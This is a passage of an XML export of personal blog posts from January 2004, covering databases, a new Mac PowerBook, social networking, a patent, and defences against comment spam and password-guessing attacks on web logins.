&lt;p&gt;There are a couple of problems here. Firstly, I've already &lt;em&gt;got&lt;/em&gt; a data abstraction layer in the form of &lt;acronym title=&quot;Structured Query Language&quot;&gt;SQL&lt;/acronym&gt;. Although there are many discrepancies between implementations, basic &lt;acronym title=&quot;Structured Query Language&quot;&gt;SQL&lt;/acronym&gt; statements such as selects and joins should work on pretty much any database. Additionally, in my three years of building web applications I can't think of a single time I've needed to change the data layer for an existing application.&lt;/p&gt;

&lt;p&gt;Modern database features such as stored procedures and constraints allow you to move huge chunks of application logic that relates to data coherency in to the database itself. In fact, PostgreSQL even allows you to write stored procedures in third party languages such as Python or Perl. With carefully written stored procedures, much of the important application logic could live in the database along with the data itself - a concept comparable to object oriented programming where the data and the methods that can be run on the data are encapsulated together.&lt;/p&gt;

&lt;p&gt;I certainly haven't made up my mind one way or the other, and at the end of the day the best approach is the one that gets a project completed in a reasonable time frame and that results in easily maintainable code. Plenty of food for thought, in any case.&lt;/p&gt;</field>
		<field name="created">2004-01-01 22:20:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1326</field>
		<field name="title">Targets for 2004</field>
		<field name="slug">targets2004</field>
		<field name="body">&lt;p&gt;Looking back on 2003, one thing really stuck out for me: I didn't learn a new programming language. &lt;a href=&quot;http://www.pragmaticprogrammer.com/&quot;&gt;The Pragmatic Programmers&lt;/a&gt; recommend learning at least one new language every year, and I've heard similar advice from other notable authorities; Ruby's Matz made a similar point in &lt;a href=&quot;http://www.artima.com/intv/craft.html&quot; title=&quot;Matz on Craftsmanship&quot;&gt;an article&lt;/a&gt; published just the other day.&lt;/p&gt;

&lt;p&gt;I learned a number of new skills and technologies in 2003, and improved on my existing knowledge in more ways than I can count. Unfortunately, everything was building on stuff I already had experience with: I didn't really learn anything completely new.&lt;/p&gt;

&lt;p&gt;2004 will be very different, mainly because I will finally have access to a Mac. Objective C and AppleScript are both on my list, and I'm looking forward to doing some serious messing around with &lt;acronym title=&quot;Graphical User Interface&quot;&gt;GUI&lt;/acronym&gt;s as well.&lt;/p&gt;

&lt;p&gt;Other than that, my two main geeky goals for this year are to become more active in the open source world (hopefully contributing some useful code) and to do a lot more writing outside of my blog. On a personal note, I plan to see at least some of America outside of Kansas. I'm only here until October and I want to make the most of it.&lt;/p&gt;</field>
		<field name="created">2004-01-01 22:55:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1327</field>
		<field name="title">Decentralised social networking</field>
		<field name="slug">decentralised</field>
		<field name="body">&lt;p&gt;I know I'm late to the party, but my recent experiments with LinkedIn and Friendster have got me all interested in the potential of software that bulids on top of people's own social networks. There's just one thing that's been bugging me, best explained by this &lt;a href=&quot;http://gigaom.com/archives/2003/12/my_network_my_way.html&quot; title=&quot;My Network, My Way!&quot;&gt;quote from Om Malik&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://gigaom.com/archives/2003/12/my_network_my_way.html&quot;&gt;&lt;p&gt;
The question I have is: why the F**K should I share my network of contacts with these commercial entities. They are like BlogSpot that does nothing for my brand equity and in many ways chews me out after making the network connections. Thus what I want is a &quot;MoveableType&quot; of social networking. Blogs took off because it was about one person - me. My social networks should be of my making for me. Lets figure out a way to cut out the middlemen.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;http://battellemedia.com/archives/000185.php&quot; title=&quot;The People Search Meme Grows: Plink&quot;&gt;Via John Battelle&lt;/a&gt;, here's the answer: &lt;a href=&quot;http://beta.plink.org/&quot; title=&quot;PLINK - People Link&quot;&gt;Plink&lt;/a&gt;, a social search engine which uses information crawled from decentralised &lt;acronym title=&quot;Friend Of A Friend&quot;&gt;FOAF&lt;/acronym&gt; files. It's nicely put together and could be just the incentive I need to finally put together my own &lt;acronym title=&quot;Friend Of A Friend&quot;&gt;FOAF&lt;/acronym&gt; file.&lt;/p&gt;

&lt;p&gt;Plink is also a nice example of the kind of thing the semantic web hopes to offer. People provide information in easily parsed formats, then others bulid third party applications on top of them that may never have been envisaged by the creators of the original standards. &lt;a href=&quot;http://www.feedster.com/&quot;&gt;Feedster&lt;/a&gt; is another great example of this effect in action.&lt;/p&gt;</field>
		<field name="created">2004-01-06 02:47:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1328</field>
		<field name="title">PaWS 2004</field>
		<field name="slug">paws</field>
		<field name="body">&lt;p&gt;Here's an interesting topic for a conference: &lt;a href=&quot;http://www.pawscon.com/&quot;&gt;PHP and Web Standards&lt;/a&gt;, to be held in Manchester from February 20th to the 24th. I've devoted a lot of time and energy to combining the two for this blog - it's a shame I'll be out of the country when the conference rolls around. I should be able to make it to &lt;a href=&quot;http://www.sxsw.com/interactive/&quot;&gt;SXSW&lt;/a&gt; this year though.&lt;/p&gt;</field>
		<field name="created">2004-01-06 03:22:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1329</field>
		<field name="title">A hacker's introduction to OS X</field>
		<field name="slug">hackingOSX</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.kernelthread.com/mac/osx/&quot;&gt;What is Max OS X&lt;/a&gt; by Amit Singh is hands down the best introduction to that operating system I've ever come across. It's aimed at a technical audience, does a very good job of keeping a fair balance balanced when comparing OS X with other operating systems and has taught me a whole bunch of interesting things about the system.&lt;/p&gt;

&lt;p&gt;Some highlights:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.kernelthread.com/mac/osx/history.html&quot;&gt;A Brief History of Mac OS X&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.kernelthread.com/mac/osx/arch_boot.html&quot; title=&quot;Booting Mac OS X&quot;&gt;Interesting tricks to play on the bootloader&lt;/a&gt;, which is apparently based on Forth&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.kernelthread.com/mac/osx/arch_startup.html&quot; title=&quot;Mac OS X System Startup&quot;&gt;What actually happens on startup&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.kernelthread.com/mac/osx/tools.html&quot; title=&quot;Mac OS X Hacking Tools&quot;&gt;Fun command-line tools that come with the system&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The rest of the author's site (which bares a striking resemblance to Eric Meyer's classic stylesheet) is worth exploring as well - he has some fascinating &lt;a href=&quot;http://www.kernelthread.com/mac/apme/&quot; title=&quot;Advanced Programming in the Mac OS X Environment&quot;&gt;notes on advanced Mac programming&lt;/a&gt;, a description of his environment of &lt;a href=&quot;http://www.kernelthread.com/mac/vpc/&quot; title=&quot;Many Systems on a PowerBook&quot;&gt;55 operating systems on one PowerBook&lt;/a&gt; and for the hard core programming geeks, &lt;a href=&quot;http://www.kernelthread.com/hanoi/&quot; title=&quot;Hanoimania!&quot;&gt;108 solutions&lt;/a&gt; to the Towers of Hanoi problem. And if that's not enough, he even has a genuine &lt;a href=&quot;http://www.kernelthread.com/miscellaneous/dek.html&quot; title=&quot;Reward Check from Professor Knuth&quot;&gt;Donald Knuth reward cheque&lt;/a&gt; as well!&lt;/p&gt;

&lt;p&gt;As for my own PowerBook, it was due to arrive today but my bank killed the card transaction because it didn't fit my normal buying habits (I'd like to know who's buying habits it &lt;em&gt;would&lt;/em&gt; fit). After a series of transatlantic phone calls and the classic statement from HSBC that &quot;you're not supposed to have credit on a credit card&quot; all is well in the world, and the system should arrive tomorrow or Friday. I await its arrival with sticky palms.&lt;/p&gt;</field>
		<field name="created">2004-01-08 03:55:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1330</field>
		<field name="title">Mac-tastic</field>
		<field name="slug">mactastic</field>
		<field name="body">&lt;p&gt;Sorry for the radio silence; I've been playing with my new Mac. It's been an almost entirely positive experience - it's certainly the most enjoyable computer I've ever owned. I've also only crashed an application once so far - bizarrely it was the Terminal while accidentally pasting in a whole bunch of junk. Other than that the system stability and performance is excellent - and it's only running on 256 &lt;acronym title=&quot;MegaBytes&quot;&gt;MB&lt;/acronym&gt; of &lt;acronym title=&quot;Random Access Memory&quot;&gt;RAM&lt;/acronym&gt; while I try and find one of those tiny screwdrivers to install the upgrade.&lt;/p&gt;

&lt;p&gt;The biggest irritation at the moment is the 'delete' key. I'm not sure if it's meant to be in-place delete or backspace, and it seems to do either one depending on the application I'm running. This sucks, and any tips on making it more predictable would be more than welcome (my biggest problems with it have been in vi). Also, does the Mac have an equivalent to the thing on Windows where holding ctrl+shift+arrow key selects the previous or next word?&lt;/p&gt;

&lt;p&gt;The other thing that sucks is only having one mouse/trackpad button. It's not like the context menu doesn't exist - you're expected to hit ctrl+mouse button to access it. My Mac experience became instantly more pleasant when I plugged in a traditional mouse with two buttons and a scroll wheel. I wish Apple would admit that the days of single button mice are long gone and give me two buttons on my trackpad.&lt;/p&gt;

&lt;p&gt;Oh, and it almost goes without saying but &lt;acronym title=&quot;Digital Video Disc&quot;&gt;DVD&lt;/acronym&gt; region encoding is the single most irritating and fundamentally &lt;em&gt;stupid&lt;/em&gt; thing the entertainment industry has ever pulled. It's like they want me to abandon legal purchases and get all my movies via BitTorrent. See also &quot;protected&quot; &lt;acronym title=&quot;Compact Disc&quot;&gt;CD&lt;/acronym&gt;s. As Cory &lt;a href=&quot;http://boingboing.net/2004_01_01_archive.html#107365869430853467&quot; title=&quot;TiVo&amp;apos;s new PC-viewing deliberately broken &quot;&gt;points out&lt;/a&gt;, there's never been any market demand for &lt;em&gt;any&lt;/em&gt; form of &lt;acronym title=&quot;Digital Rights Management&quot;&gt;DRM&lt;/acronym&gt;. Bypassing the region check on my PowerBook using a firmware upgrade would &lt;a href=&quot;http://www.wormintheapple.gr/macdvd/faq.html#9&quot; title=&quot;What are the dangers of patching my DVD drives&amp;apos; firmware?&quot;&gt;void the warranty&lt;/a&gt;, so since I shelled out for AppleCare it isn't an option. I guess the &lt;acronym title=&quot;Digital Video Disc&quot;&gt;DVD&lt;/acronym&gt;s I brought with from England (some of which are unavailable in the &lt;acronym title=&quot;United States&quot;&gt;US&lt;/acronym&gt; anyway) will have to stay in my suit case.&lt;/p&gt;

&lt;p&gt;Irritations out of the way, here's a list of things that have made me go &quot;ooh&quot;:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;The whole thing is just ridiculously good looking, from the PowerBook itself to the operating system. I have not had an ugly moment since I first booted it up.&lt;/li&gt;
 &lt;li&gt;The default screensaver is also &lt;em&gt;gorgeous&lt;/em&gt;.&lt;/li&gt;
 &lt;li&gt;I plugged an external monitor in to it and it instantly shared my desktop across the laptop and monitor screen flawlessly. In fact, everything I've plugged in to it so far (digital camera, iSight, &lt;acronym title=&quot;Universal Serial Bus&quot;&gt;USB&lt;/acronym&gt; mouse) has Just Worked.&lt;/li&gt;
 &lt;li&gt;I wanted to copy files across from my work Windows machine, but I only had one network cable. I plugged one end in to the Mac and the other in to the PC and the Mac worked out what I was trying to do and pretended the cable was a crossover cable. Then I turned on Windows Sharing (aka Samba) and copied the files across in a couple of minutes.&lt;/li&gt;
 &lt;li&gt;Like everything else, networking Just Works - plug a cable in or turn on the AirPort and surf away.&lt;/li&gt;
 &lt;li&gt;The Unix side of things is just excellent. Thanks to &lt;a href=&quot;http://fink.sourceforge.net/&quot;&gt;Fink&lt;/a&gt; and &lt;a href=&quot;http://developer.apple.com/internet/macosx/postgres.html&quot; title=&quot;PostgreSQL on Mac OS X&quot;&gt;this tutorial&lt;/a&gt; it took all of five minutes to get a PostgreSQL server up and running.&lt;/li&gt;
 &lt;li&gt;Exposé is pure unadulterated magic. It makes up for the Dock being &lt;a href=&quot;http://tbray.org/ongoing/When/200x/2003/10/01/HowToUseOSX&quot; title=&quot;Broken As Designed&quot;&gt;B.A.D&lt;/a&gt;. It's also really, really pretty to watch. I'm such a whore for cheap visual effects.&lt;/li&gt;
 &lt;li&gt;My Mac can talk to me! And I can talk back to it! Admittedly my English accent means it only responds to &quot;Computer - start screensaver&quot; and there doesn't appear to be a training option anywhere but it was still pretty cool that it had voice + speak recognition abilities built in.&lt;/li&gt;
 &lt;li&gt;Software installation on Macs is a breeze. Most software comes as a downloadable drive image - you click it in Safari, it downloads and auto-mounts and lets you drag the application to where-ever you want it to live (normally the Applications directory). I just &lt;em&gt;love&lt;/em&gt; the way all of the supporting files for an app are hidden away in its package so you can drag the whole lot around without worrying about where the extra bits and pieces are.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I'll try not to turn this in to another obsessive Mac fan blog, but let's just say that I'm beginning to realise what I've been missing. I'm not going back.&lt;/p&gt;</field>
		<field name="created">2004-01-10 06:01:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1331</field>
		<field name="title">Backseat driving</field>
		<field name="slug">backseatDriving</field>
		<field name="body">&lt;blockquote cite=&quot;http://www.eod.com/devil/archive/extreme_programming.html&quot;&gt;
&lt;dl&gt;
&lt;dt&gt;&lt;strong&gt;extreme programming&lt;/strong&gt;, &lt;em&gt;noun&lt;/em&gt;&lt;/dt&gt;
&lt;dd&gt;
&lt;p&gt;A method of software development that combines all the charm of backseat driving with all the efficiency of a marital squabble.&lt;/p&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/blockquote&gt;

&lt;p&gt;Just one of the many gems to be found in Greg Knauss' &lt;a href=&quot;http://www.eod.com/devil/archive/&quot;&gt;Devil's Dictionary&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2004-01-10 06:25:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1332</field>
		<field name="title">Doing more with the iSight
</field>
		<field name="slug">doingMoreWithISight</field>
		<field name="body">&lt;p&gt;The iSight came close to being the biggest disappointments of my new Mac experience. It looks gorgeous and appears to integrate seamlessly with iChat AV,  although as I don't currently have any contacts with an iSight I haven't been able to try video conferencing yet. The dissapointment is that there was no clear way of using it to capture video directly - a feature that I reasonably expected from iMovie. Apple's knowledge base knocks the point home &lt;a href=&quot;http://docs.info.apple.com/article.html?artnum=61929&quot; title=&quot;iSight: &amp;quot;No Camera Attached&amp;quot; Message in iMovie&quot;&gt;pretty clearly&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://docs.info.apple.com/article.html?artnum=61929&quot;&gt;&lt;p&gt;iSight is intended for use as a video conferencing camera, and does not output the DV format necessary for capturing video with iMovie.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Well &lt;em&gt;that&lt;/em&gt; sucks. Thanksfully before writing the thing off completely I did some Googling and turned up this excellent O'Reilly article: &lt;a href=&quot;http://www.macdevcenter.com/pub/a/mac/2003/07/01/isight.html&quot;&gt;Making Movies with the Apple iSight&lt;/a&gt;, which shows how Apple's free &lt;a href=&quot;http://www.apple.com/quicktime/products/broadcaster/&quot;&gt;QuickTime Broadcaster&lt;/a&gt; software can be used to capture footage straight from the iSight to disk.&lt;/p&gt;

&lt;p&gt;Surprisingly for Apple the procedure is far from transparent, but at least it's possible.&lt;/p&gt;

&lt;p&gt;Oh, and the biggest disappointment? The fabled backlit keyboard, which tends to be drowned out by the light from the laptop screen making it more of a gimmick than a useful feature.&lt;/p&gt;</field>
		<field name="created">2004-01-13 01:15:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1333</field>
		<field name="title">You mean there IS an IE team?</field>
		<field name="slug">ieTeam</field>
		<field name="body">&lt;p&gt;Robert Scoble &lt;a href=&quot;http://radio.weblogs.com/0001011/2004/01/14.html#a6183&quot; title=&quot;Internet Explorer team lunch&quot;&gt;went to lunch&lt;/a&gt; with the head of the Internet Explorer team - yes, they still exist, despite having released nothing but security patches for over two years.&lt;/p&gt;

&lt;p&gt;Robert says that &lt;q cite=&quot;http://radio.weblogs.com/0001011/2004/01/14.html#a6183&quot;&gt;the team is looking to work with community members to improve Internet Explorer.&lt;/q&gt; If this means dialogue, or even some feedback on what they're up to, this is a very good thing. Less promising is Robert's &lt;a href=&quot;http://radio.weblogs.com/0001011/2004/01/14.html#a6186&quot; title=&quot;IE conversation is great&quot;&gt;follow-up comment&lt;/a&gt; on the topic of improved &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; and &lt;acronym title=&quot;Portable Network Graphics&quot;&gt;PNG&lt;/acronym&gt; support (by far the most requested developer feature):&lt;/p&gt;

&lt;blockquote cite=&quot;http://radio.weblogs.com/0001011/2004/01/14.html#a6186&quot;&gt;&lt;p&gt;Another thing that the commenters generally aren't thinking of is &quot;how to get adoption.&quot; I keep pointing out that if we fixed the CSS and PNG issues, you still wouldn't be able to use those for years. Why? Cause consumers (and companies) really don't care about those issues and won't download a new version just cause you fixed one or two issues.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Believe us, &lt;em&gt;we know&lt;/em&gt;. That's why we want these issues to be fixed as soon as possible - so we can deploy sites that take advantages of these standards before the oil runs out and human civilisation disintegrates in to a mass of warring tribes more interested in canibalism than visually appealing web sites.&lt;/p&gt;</field>
		<field name="created">2004-01-15 04:50:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1334</field>
		<field name="title">Advice worth repeating</field>
		<field name="slug">explanation</field>
		<field name="body">&lt;p&gt;Tim Bray's &lt;a href=&quot;http://www.tbray.org/ongoing/When/200x/2004/01/13/LawOfConversation&quot; title=&quot;Two Laws of Explanation&quot;&gt;Laws of Explanation&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.tbray.org/ongoing/When/200x/2004/01/13/LawOfConversation&quot;&gt;
&lt;h4&gt;The First Law&lt;/h4&gt;

&lt;p&gt;When you're explaining something to somebody and they don't get it, that's not their problem, it's your problem.&lt;/p&gt;

&lt;h4&gt;The Second Law&lt;/h4&gt;

&lt;p&gt;When someone's explaining something to you and you're not getting it, it's not your problem, it's their problem.&lt;/p&gt;
&lt;/blockquote&gt;</field>
		<field name="created">2004-01-15 04:54:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1335</field>
		<field name="title">This could be the most ludicrous tech patent yet</field>
		<field name="slug">ludicrous</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://patft.uspto.gov/netacgi/nph-Parser?Sect1=PTO1&amp;amp;Sect2=HITOFF&amp;amp;d=PALL&amp;amp;p=1&amp;amp;u=/netahtml/srchnum.htm&amp;amp;r=1&amp;amp;f=G&amp;amp;l=50&amp;amp;s1=6,671,714.WKU.&amp;amp;OS=PN/6,671,714&amp;amp;RS=PN/6,671,714&quot;&gt;Patent 6,671,714&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://patft.uspto.gov/netacgi/nph-Parser?Sect1=PTO1&amp;amp;Sect2=HITOFF&amp;amp;d=PALL&amp;amp;p=1&amp;amp;u=/netahtml/srchnum.htm&amp;amp;r=1&amp;amp;f=G&amp;amp;l=50&amp;amp;s1=6,671,714.WKU.&amp;amp;OS=PN/6,671,714&amp;amp;RS=PN/6,671,714&quot;&gt;&lt;p&gt;What is claimed is:&lt;/p&gt;

&lt;p&gt;1. A method for assigning URL's and e-mail addresses to members of a group comprising the steps of:&lt;/p&gt;

&lt;p&gt;assigning each member of said group a URL of the form &quot;name.subdomain.domain&quot;; and &lt;/p&gt;

&lt;p&gt;assigning each member of said group an e-mail address of the form &quot;name@subdomain.domain;&quot; &lt;/p&gt;

&lt;p&gt;wherein the &quot;name&quot; portion of said URL and said e-mail address is the same and unique for each particular one of said members such that an only difference between said URL and said e-mail address for said member is that in said URL the &quot;@&quot; symbol of the e-mail address is replaced with a &quot;.&quot; and wherein said &quot;subdomain&quot; portion of said URL and said e-mail address is the same for all members of said group.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If that isn't proof that the patent system is just fundamentally flawed I don't know what is.&lt;/p&gt;
</field>
		<field name="created">2004-01-16 00:50:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1336</field>
		<field name="title">Moveable Type now kills PageRank on comment links</field>
		<field name="slug">mtPageRankKiller</field>
		<field name="body">&lt;p&gt;This is pretty cool: &lt;a href=&quot;http://www.movabletype.org/news/2004_01.shtml#000882&quot;&gt;Moveable Type 2.661 is out&lt;/a&gt; and includes a whole bunch of comment spam fighting features, including one inspired by &lt;a href=&quot;http://simon.incutio.com/archive/2003/10/13/linkRedirects&quot; title=&quot;New anti-comment-spam measure&quot;&gt;my own anti-spam measure&lt;/a&gt; of disabling PageRank on links from comments by sending them through a redirect. This is great news for me as the redirect acts as a deterrent, and deterrents are only worthwhile if people know about them in the first place. With the most popular blogging system (at least amongst comment spammers) now featuring the same deterrent hopefully &lt;acronym title=&quot;Search Engine Optimisation&quot;&gt;SEO&lt;/acronym&gt; spammers will start to get the message.&lt;/p&gt;</field>
		<field name="created">2004-01-21 20:05:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1337</field>
		<field name="title">Defending web applications against dictionary attacks</field>
		<field name="slug">defendingWebApplications</field>
		<field name="body">&lt;p&gt;Over at Reflective Surface, Ronaldo M. Ferraz &lt;a href=&quot;http://www.reflectivesurface.com/weblog/archives/2004/01/21/security_vs_usability&quot; title=&quot;Security vs. usability&quot;&gt;discusses&lt;/a&gt; the usability of an authentication system that locks down an account for a certain period of time after three failed login attempts. Ronaldo sees this as a trade off between usability and security, but I see it more as an added security issue in that it allows malicious third parties to lock other user's accounts armed only with their username.&lt;/p&gt;

&lt;p&gt;The problem then is how best to defend web applications against brute force password guessing attacks without enabling denial of service attacks at the same time. The largest risk is from automated scripts that try every possible password until they get in. Identifying these attacks should be trivial - a real user could potentially fail a dozen or so times, but would be unlikely to try hundreds of combinations in quick succession. Assuming a malicious cracking attempt has been identified, what steps should a system take to foil the attack while still allowing the real user to access the site?&lt;/p&gt;

&lt;p&gt;I can think of a few options, none of which seem like the ideal solution:&lt;/p&gt;

&lt;ol&gt;
 &lt;li&gt;Ban login requests from the attacker's &lt;acronym title=&quot;Internet Protocol&quot;&gt;IP&lt;/acronym&gt; address. This introduces the usual problems with &lt;acronym title=&quot;Internet Protocol&quot;&gt;IP&lt;/acronym&gt; banning, namely the risk of banning a whole bunch of people indiscriminately but leaving the attacker free to skip the ban using open web proxies.&lt;/li&gt;
 &lt;li&gt;Lock the user's account and email them a warning of the attack and a special key needed to unlock the account again. This relies on the user having access to their email account when they next have a need to access the system. It also assumes that the user's email account is secure, but since both the user's password and the secret unlocking key will be required to access the system email security is of less importance (the user's password is not sent with the unlock key).&lt;/li&gt;
 &lt;li&gt;Send an automated alert to a system administrator so they can analyze the situation in real time and take any necessary action. This relies on administrators being available 24/7 - hardly a safe assumption for most systems.&lt;/li&gt;
 &lt;li&gt;After a certain number of failed attempts, challenge the user to &quot;prove their humanity&quot; with one of those obscured-text-as-image things. This comes with accessibility issues which have as yet been unresolved.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;If anyone has any better solutions, please leave a comment.&lt;/p&gt;</field>
		<field name="created">2004-01-22 01:02:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1338</field>
		<field name="title">Simple tricks for more usable forms</field>
		<field name="slug">moreUsableForms</field>
		<field name="body">&lt;p&gt;My second article for SitePoint has been published: &lt;a href=&quot;http://www.sitepoint.com/article/1273&quot;&gt;Simple tricks for more usable forms&lt;/a&gt;. It examines a whole bunch of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; and Javascript tricks for improving the usability of web based forms without impairing their accessibility to clients that don't support those technologies. The article has already had some useful feedback on the forums, including the valuable observation that auto-selecting the contents of a form field when it receives the focus can have a negative effect on the usability of Unix browsers, where mouse buttons are frequently used for coping and pasting.&lt;/p&gt;</field>
		<field name="created">2004-01-23 00:46:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1339</field>
		<field name="title">Solving comment spam</field>
		<field name="slug">solvingCommentSpam</field>
		<field name="body">&lt;p&gt;There are two main schools of thought concerning comment spam: the optimists and the defeatists. Optimists believe that comment spam can be beaten with technology; defeatists (maybe I should call them pessimists) believe that comments are as doomed as email and we're all &lt;a href=&quot;http://diveintomark.org/archives/2003/11/15/more-spam&quot; title=&quot;dive into mark: Weblog spam&quot;&gt;going to hell in a hand basket&lt;/a&gt;.&lt;/p&gt;

&lt;h4&gt;The story so far&lt;/h4&gt;

&lt;p&gt;I fall squarely in to the techno-optimist category. Back in September I started &lt;a href=&quot;http://simon.incutio.com/archive/2003/09/02/blacklisting&quot; title=&quot;Blacklisting Comment Spam&quot;&gt;blacklisting domains&lt;/a&gt; linked to from spam comments, defending against return visits from spammers and allowing others to syndicate my block list to run on their own site. Then in October I tweaked my comment system to &lt;a href=&quot;http://simon.incutio.com/archive/2003/10/13/linkRedirects&quot; title=&quot;New anti-comment-spam measure&quot;&gt;eliminate PageRank&lt;/a&gt; from links in comments, making spamming for search engine optimisation a futile exercise. Of course, this measure only works if spammers realise it's there (I know &lt;a href=&quot;http://msittig.blogspot.com/2003_11_01_msittig_archive.html#106981977439323929&quot; title=&quot;and they called ME a greedy bastard!&quot;&gt;at least one has&lt;/a&gt;) which is why I'm personally very happy to see that the latest release of Moveable Type has &lt;a href=&quot;http://simon.incutio.com/archive/2004/01/21/mtPageRankKiller&quot; title=&quot;Moveable Type now kills PageRank on comment links&quot;&gt;adopted the technique&lt;/a&gt; - to mixed reviews from the &lt;acronym title=&quot;Moveable Type&quot;&gt;MT&lt;/acronym&gt; community.&lt;/p&gt;

&lt;p&gt;There have been a whole bunch of other technological innovations over the past few months. Sam Ruby has &lt;a href=&quot;http://www.intertwingly.net/blog/1647.html&quot; title=&quot;Comment Throttle&quot;&gt;implemented throttling&lt;/a&gt; to ban people who post three consecutive comments, and has some great ideas about &lt;a href=&quot;http://www.intertwingly.net/blog/1699.html&quot;&gt;guarding against strangers&lt;/a&gt;. Jay Allen's &lt;a href=&quot;http://www.jayallen.org/projects/mt-blacklist/&quot;&gt;MT-Blacklist&lt;/a&gt; makes the blacklisting concept available to a wide audience. Meanwhile, James Seng's &lt;a href=&quot;http://james.seng.cc/archives/000152.html&quot; title=&quot;Bayesian filter for MT&quot;&gt;MT-Bayesian&lt;/a&gt; introduces trainable spam filters adapted from the fight against email spam.&lt;/p&gt;

&lt;h4&gt;The challenges ahead&lt;/h4&gt;

&lt;p&gt;So those are the solutions so far; the critical question is whether they work. The amount of spam I've been getting has definitely decreased, but as I run a completely custom blogging system I'm safe from the automated scripts that target more widespread systems - other sites make easier targets. Now that the less ethical search engine optimisers have started to catch on to the potential of comment spam to improve their PageRank the amount of spam can only increase. Some bloggers have already &lt;a href=&quot;http://www.simplebits.com/archives/2004/01/22/comments_are_down.html&quot; title=&quot;Comments are Down&quot;&gt;started to disable comments entirely&lt;/a&gt; (thankfully Dan turned them back on again shortly afterwards), setting a worrying precedent for the elimination two way interactions comments allow between bloggers and non-bloggers.&lt;/p&gt;

&lt;p&gt;I'll put it in writing now: I will never disable comments on this blog. In the past few months the comments here have proved far more interesting and valuable than my actual posts, and I really appreciate the quality of the discussions that have arisen here. I will take whatever steps are necessary to keep this a useful environment for discussion.&lt;/p&gt;

&lt;p&gt;Many people have hailed user registration as the ultimate solution to spam. It isn't, because the value of PageRank is just too high - and writing a script to automatically create accounts (even with email confirmation required) is child's play to anyone who is competent in an internet-aware scripting language. Even accessibility-impeding &lt;a href=&quot;http://www.captcha.net/&quot;&gt;captchas&lt;/a&gt; are no defence against spammers who can afford to employ cheap labour to defeat them - and with search engine rankings as critical as they are there's no shortage of spam dollars.&lt;/p&gt;

&lt;p&gt;With those ruled out, let's look at the remaining solutions:&lt;/p&gt;

&lt;h4&gt;The killer&lt;/h4&gt;

&lt;p&gt;Without links, comment spam has no purpose. To eliminate spam, eliminate links. Redirecting them through a PageRank killer already achieves this, but proves too subtle for spammers intent on spreading their links as widely as they can. Too truly eliminate spam, strip out links and anything that even &lt;em&gt;looks&lt;/em&gt; like a &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; and force the spammer to preview their carefully crafted advertisement before hitting submit. Seeing as hyperlinks are the single most important feature of the web this may seem draconian - and indeed it is. But on a site that serves more as a discussion forum than a farm and where the alternative to killing links is killing comments entirely this could be the saving factor.&lt;/p&gt;

&lt;p&gt;For most blogs however links are an essential part of the discourse - I certainly wouldn't want to disable them here. Now only do they add huge value to the discussions, but more importantly they act as a &quot;signature&quot; for many commenters - knowing a comment is by &quot;Dan&quot; is far less useful than knowing that it's by Dan from &lt;a href=&quot;http://www.simplebits.com/&quot;&gt;www.simplebits.com&lt;/a&gt;.&lt;/p&gt;

&lt;h4&gt;Finding a compromise&lt;/h4&gt;

&lt;p&gt;Draconian measures such as the above wouldn't be necessary if spammers would wise up to the fact that their carefully crafted missives were having no effect on their precious PageRank. The real challenge then is to make anti-PageRank measures obvious to even the most brain-addled viagra peddlers. I've taken the first step towards this by turning on compulsory previewing for comments, which should have the added benefit of reminding legitimate commenters to use paragraph tags. I'll be working on ways of making the anti PageRank measures more obvious over the next few days, as and when work permits.&lt;/p&gt;

&lt;p&gt;I've seen people argue that depriving legitimate commenters of PageRank is a poor compromise. I disagree: if the only cost of eliminating the incentive to spam is the loss of some Google ego then I see it as a price well worth paying. Of course, I say that as someone who's already built up their &lt;a href=&quot;http://www.google.com/search?q=simon&quot; title=&quot;Number 5, baby!&quot;&gt;Google ego&lt;/a&gt; but at the end of the day it's my blog, my rules. One solution I've considered is creating a whitelist of sites that frequent commenters use in their signatures, causing them to be displayed without a redirect.&lt;/p&gt;

